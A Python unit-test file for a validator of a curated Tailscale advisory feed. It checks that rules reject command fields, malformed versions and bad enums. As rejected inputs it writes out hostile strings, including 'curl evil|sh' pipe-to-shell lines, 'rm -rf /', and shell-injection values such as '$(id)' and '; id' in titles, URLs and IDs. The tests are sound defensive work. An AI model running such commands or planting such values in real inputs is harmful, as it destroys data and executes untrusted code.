import contextlib
import copy
import io
import json
import os
import unittest

import helpers  # noqa: F401  (sets sys.path)
import validate_curated
from feedlib import FeedError

with open(os.path.join(helpers.ROOT, "curated", "curated.json"), "rb") as handle:
    GOOD_BYTES = handle.read()
GOOD = json.loads(GOOD_BYTES)


def with_rule(**changes):
    doc = copy.deepcopy(GOOD)
    for key, value in changes.items():
        if value is None:
            del doc["rules"][0][key]
        else:
            doc["rules"][0][key] = value
    return doc


class CuratedFileTests(unittest.TestCase):
    def test_committed_file_is_valid(self):
        doc = validate_curated.load_and_validate(GOOD_BYTES)
        self.assertEqual([r["id"] for r in doc["rules"]],
                         ["tailscale-ts-2026-014-017", "tailscale-1.104.5-ssh-stalls"])

    def test_the_two_plan_rules(self):
        security, recommended = GOOD["rules"]
        self.assertEqual((security["below"], security["severity"], security["appliesTo"]), ("1.104.4", 3, "any"))
        self.assertNotIn("kind", security)
        self.assertEqual((recommended["below"], recommended["severity"], recommended["kind"],
                          recommended["appliesTo"]), ("1.104.5", 1, "recommended", "tailnet"))

    def test_schema_and_validator_agree_on_fields(self):
        with open(os.path.join(helpers.ROOT, "curated", "curated.schema.json")) as handle:
            schema = json.load(handle)
        item = schema["properties"]["rules"]["items"]
        self.assertEqual(set(item["properties"]), validate_curated.ALLOWED)
        self.assertEqual(set(item["required"]), validate_curated.REQUIRED)
        self.assertEqual(item["properties"]["product"]["enum"], list(validate_curated.PRODUCTS))


class RejectTests(unittest.TestCase):
    def assertRejected(self, doc, fragment):
        errors = validate_curated.validate(doc)
        self.assertTrue(any(fragment in e for e in errors), f"{fragment!r} not in {errors}")

    def test_command_fields_rejected(self):
        for key in ("command", "cmd", "run", "script", "fix", "recipe", "install", "shell", "exec", "args"):
            with self.subTest(key=key):
                self.assertRejected(with_rule(**{key: "curl x | sh"}), "never carries a command")

    def test_command_field_at_top_level_rejected(self):
        doc = copy.deepcopy(GOOD)
        doc["script"] = "rm -rf /"
        self.assertRejected(doc, "never carries a command")

    def test_unknown_field_rejected(self):
        self.assertRejected(with_rule(note="hello"), "unknown field 'note'")

    def test_unknown_product_rejected(self):
        for product in ("docker", "herdr", "Tailscale", "", 3):
            with self.subTest(product=product):
                self.assertRejected(with_rule(product=product), "unknown product")

    def test_malformed_versions_rejected(self):
        for version in ("1.104", "1.104.4.1", "v1.104.4", "1.104.4-rc1", "01.104.4", "1.104.04", " 1.104.4",
                        "1.104.4\n", "", 1104, None):
            with self.subTest(version=version):
                if version is None:
                    self.assertRejected(with_rule(below=None), "missing 'below'")
                else:
                    self.assertRejected(with_rule(below=version, fixedIn="9.9.9"), "not plain N.N.N")
                    self.assertRejected(with_rule(fixedIn=version), "not plain N.N.N")

    def test_fixed_in_below_floor_rejected(self):
        self.assertRejected(with_rule(fixedIn="1.104.3"), "below the floor")

    def test_bad_enums_and_severity(self):
        self.assertRejected(with_rule(severity=5), "severity")
        self.assertRejected(with_rule(severity=True), "severity")
        self.assertRejected(with_rule(severity="3"), "severity")
        self.assertRejected(with_rule(kind="critical"), "kind")
        self.assertRejected(with_rule(appliesTo="lan"), "appliesTo")

    def test_text_cannot_smuggle_shell(self):
        for title in ("Update now $(curl evil|sh)", "Run `id`", "a; rm -rf /", "line\nbreak", "x" * 121):
            with self.subTest(title=title):
                self.assertRejected(with_rule(title=title), "title")
        for url in ("http://tailscale.com/x", "javascript:alert(1)", "https://x.com/a b", "https://x.com/?q=$(id)"):
            with self.subTest(url=url):
                self.assertRejected(with_rule(url=url), "url")
        self.assertRejected(with_rule(ids=["TS-2026-014; id"]), "ids")

    def test_duplicate_id_rejected(self):
        doc = copy.deepcopy(GOOD)
        doc["rules"][1]["id"] = doc["rules"][0]["id"]
        self.assertRejected(doc, "duplicate id")

    def test_duplicate_json_key_rejected(self):
        raw = GOOD_BYTES.replace(b'"severity":3,', b'"severity":3,"severity":1,')
        self.assertNotEqual(raw, GOOD_BYTES)
        with self.assertRaisesRegex(FeedError, "duplicate JSON key"):
            validate_curated.load_and_validate(raw)

    def test_oversized_file_rejected(self):
        with self.assertRaisesRegex(FeedError, "at most"):
            validate_curated.load_and_validate(b" " * (validate_curated.CURATED_CAP + 1))

    def test_cli_exit_codes(self):
        with contextlib.redirect_stdout(io.StringIO()), contextlib.redirect_stderr(io.StringIO()):
            self.assertEqual(validate_curated.main([os.path.join(helpers.ROOT, "curated", "curated.json")]), 0)
            self.assertEqual(validate_curated.main([os.path.join(helpers.ROOT, "nope.json")]), 1)


if __name__ == "__main__":
    unittest.main()
